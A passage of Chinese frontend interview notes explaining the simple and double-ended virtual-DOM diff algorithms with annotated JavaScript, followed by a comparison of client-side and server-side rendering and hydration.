    unmount(oldVNode);
  }
}
```

diff 算法的目的是根据 key 复用 dom 节点，通过移动节点而不是创建新节点来减少 dom 操作。
对于每个新的 vnode，在旧的 vnode 中根据 key 查找一下，如果没查找到，那就新增 dom 节点，如果查找到了，那就可以复用。
复用的话要不要移动要判断下下标，如果下标在 lastIndex 之后，就不需要移动，因为本来就在后面，反之就需要移动。
最后，把旧的 vnode 中在新 vnode 中没有的节点从 dom 树中删除。

### 双端 diff

简单 diff 算法能够实现 dom 节点的复用，但有的时候会做一些没必要的移动。双端 diff 算法解决了这个问题，它是从两端进行对比。

原来的顺序是 A, B, C, D，现在变成了 D, C, B, A。

简单 Diff 算法（单端对比）的表现
策略：只从头部开始对比。
第1步：新头 D vs 旧头 A → 不匹配。
第2步：在旧列表中找 D，发现它在最后。
操作：把 D 从末尾移动到开头。
此时内存/虚拟结构变为：D, A, B, C
第3步：新第2个 C vs 旧第2个 A → 不匹配。
第4步：在剩余旧列表找 C，发现它在最后。
操作：把 C 移动到 D 后面。
此时变为：D, C, A, B
...以此类推
结果：简单算法需要进行 3次移动操作（移动 D, C, B），效率较低。它没发现其实只是整体反过来了。

#### 双端 diff

简单 diff 算法能够实现 dom 节点的复用，但有的时候会做一些没必要的移动。双端 diff 算法解决了这个问题，它是从两端进行对比。

我们需要 4 个指针，分别指向新旧两个 vnode 数组的头尾：

![](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/958ae402338c4cf0a4aa6ff5a5484754~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

头和尾的指针向中间移动，直到 oldStartIdx <= oldEndIdx 并且 newStartIdx <= newEndIdx，说明就处理完了全部的节点。

```
// 获取旧虚拟 DOM 节点和新虚拟 DOM 节点的子节点列表
const oldChildren = n1.children;
const newChildren = n2.children;

// ==================== 初始化四个指针 ====================
let oldStartIdx = 0;                          // 旧子节点列表的起始索引（头）
let oldEndIdx = oldChildren.length - 1;       // 旧子节点列表的结束索引（尾）
let newStartIdx = 0;                          // 新子节点列表的起始索引（头）
let newEndIdx = newChildren.length - 1;       // 新子节点列表的结束索引（尾）

// 获取当前四个位置对应的虚拟节点
let oldStartVNode = oldChildren[oldStartIdx];     // 旧头节点
let oldEndVNode = oldChildren[oldEndIdx];         // 旧尾节点
let newStartVNode = newChildren[newStartIdx];     // 新头节点
let newEndVNode = newChildren[newEndIdx];         // 新尾节点

// ==================== 主循环：当新旧列表都还有未处理节点时继续 ====================
while (oldStartIdx <= oldEndIdx && newStartIdx <= newEndIdx) {

  // 【边界检查】如果旧头节点已被标记为 undefined（已移动），则跳过它，前进旧头指针
  if (!oldStartVNode) {
    oldStartVNode = oldChildren[++oldStartIdx];
  }
  // 【边界检查】如果旧尾节点已被标记为 undefined，则跳过它，后退旧尾指针
  else if (!oldEndVNode) {
    oldEndVNode = oldChildren[--oldEndIdx];
  }

  // ==================== 情况一：新头 vs 旧头 → key 相同 ====================
  else if (oldStartVNode.key === newStartVNode.key) {
    // 复用节点，更新内容
    patch(oldStartVNode, newStartVNode, container);
    // 移动指针：旧头++，新头++
    oldStartVNode = oldChildren[++oldStartIdx];
    newStartVNode = newChildren[++newStartIdx];
  }

  // ==================== 情况二：新尾 vs 旧尾 → key 相同 ====================
  else if (oldEndVNode.key === newEndVNode.key) {
    // 复用节点，更新内容
    patch(oldEndVNode, newEndVNode, container);
    // 移动指针：旧尾--，新尾--
    oldEndVNode = oldChildren[--oldEndIdx];
    newEndVNode = newChildren[--newEndIdx];
  }

  // ==================== 情况三：新尾 vs 旧头 → key 相同 ====================
  // 说明旧头节点需要移动到末尾（因为新尾部是它）
  else if (oldStartVNode.key === newEndVNode.key) {
    // 复用节点，更新内容
    patch(oldStartVNode, newEndVNode, container);
    // 将旧头节点对应的 DOM 插入到旧尾节点的下一个兄弟之前（即移到末尾）
    insert(oldStartVNode.el, container, oldEndVNode.el.nextSibling);
    // 移动指针：旧头++，新尾--
    oldStartVNode = oldChildren[++oldStartIdx];
    newEndVNode = newChildren[--newEndIdx];
  }

  // ==================== 情况四：新头 vs 旧尾 → key 相同 ====================
  // 说明旧尾节点需要移动到开头（因为新头部是它）
  else if (oldEndVNode.key === newStartVNode.key) {
    // 复用节点，更新内容
    patch(oldEndVNode, newStartVNode, container);
    // 将旧尾节点对应的 DOM 插入到旧头节点之前（即移到开头）
    insert(oldEndVNode.el, container, oldStartVNode.el);
    // 移动指针：旧尾--，新头++
    oldEndVNode = oldChildren[--oldEndIdx];
    newStartVNode = newChildren[++newStartIdx];
  }

  // ==================== 情况五：以上都不匹配 → 在旧列表中查找新头节点 ====================
  else {
    // 遍历旧子节点列表，寻找与 newStartVNode 拥有相同 key 的节点
    const idxInOld = oldChildren.findIndex(
      node => node && node.key === newStartVNode.key  // 注意：node 可能为 undefined
    );

    if (idxInOld > 0) {
      // 找到了可复用的节点
      const vnodeToMove = oldChildren[idxInOld];
      // 更新该节点内容
      patch(vnodeToMove, newStartVNode, container);
      // 将该节点移动到当前旧头节点的位置（保持顺序）
      insert(vnodeToMove.el, container, oldStartVNode.el);
      // 标记原位置为 undefined，避免重复处理
      oldChildren[idxInOld] = undefined;
    } else {
      // 没找到 → 创建新节点，插入到旧头节点之前
      patch(null, newStartVNode, container, oldStartVNode.el);
    }
    // 无论是否找到，新头指针都要前进
    newStartVNode = newChildren[++newStartIdx];
  }
}

// ==================== 循环结束后，处理剩余节点 ====================

// 如果旧列表先遍历完（oldEndIdx < oldStartIdx），但新列表还有剩余 → 添加新节点
if (oldEndIdx < oldStartIdx && newStartIdx <= newEndIdx) {
  for (let i = newStartIdx; i <= newEndIdx; i++) {
    // 插入位置参考：oldStartVNode.el（此时它可能是下一个待处理节点或容器末尾）
    patch(null, newChildren[i], container, oldStartVNode?.el || null);
  }
}

// 如果新列表先遍历完（newEndIdx < newStartIdx），但旧列表还有剩余 → 移除旧节点
else if (newEndIdx < newStartIdx && oldStartIdx <= oldEndIdx) {
  for (let i = oldStartIdx; i <= oldEndIdx; i++) {
    // 只卸载未被标记为 undefined 的节点（已被移动的节点不需要再卸载）
    if (oldChildren[i]) {
      unmount(oldChildren[i]);
    }
  }
}
```

## 了解SSR吗？

- CSR 
    Client-Side Rendering
    是先返回一个空壳 HTML(#root)，由浏览器通过 JS 渲染页面。
    npm init vite 
    CSR 的原理是前端接管渲染流程(组件渲染在 客户端（即用户的浏览器） 完成)，优点是交互流畅（局部更新实现无刷新交互，避免了整页重载）、前后端分离，但缺点也明显：首屏加载慢（CSR 需下载解析 JS 并请求数据后渲染，过程串行阻塞，导致首屏白屏时间较长， 所以要路由懒加载）、SEO 不友好，因为初始 HTML 几乎没有内容。

    https://juejin.cn/post/7559385680842883099

- SSR
    SSR（Server-Side Rendering）是指React在服务器端将组件和数据渲染为完整HTML字符串后再返回给浏览器

    SSR 的核心逻辑是在服务器拿到数据后，直接生成包含内容的 HTML，再发送到客户端，客户端再进行 hydration（水合）（激活事件绑定）。这样做的最大优势是首屏直出，加载速度快，同时对搜索引擎友好。

    服务端生成的 HTML 虽然内容完整，但缺乏事件监听（如点击、输入）和组件状态。Hydration 就是让 React/Vue 等框架在客户端“接管”这些静态 DOM 节点，为其绑定事件处理程序并恢复应用状态，使页面从“只读”变为“可交互”。

    Hydration 的大白话原理

    就是浏览器拿着已有的 HTML，让 JS 重新跑一遍代码做对比，确认没毛病后，把点击事件贴上去。

    核心模块/功能
    复用 DOM：不重新画页面，直接利用服务器返回的现成 HTML。
    
    事件绑定：给静态标签挂上点击、输入等交互功能。

    SSR 本质上解决的是首屏性能和 SEO 问题，但也带来服务器压力大、开发复杂度高的问题。

    场景上，CSR 更适合后台管理系统、强交互应用，IOS/Android 很多页面其实都是WebView, 不在乎SEO, 开发快速，兼容多平台；SSR 更适合内容型网站、电商、营销页等对首屏速度和 SEO 要求高的业务。



## 利用cursor vibe一个节点连线的项目 包含 登录系统

1. 逆向思维




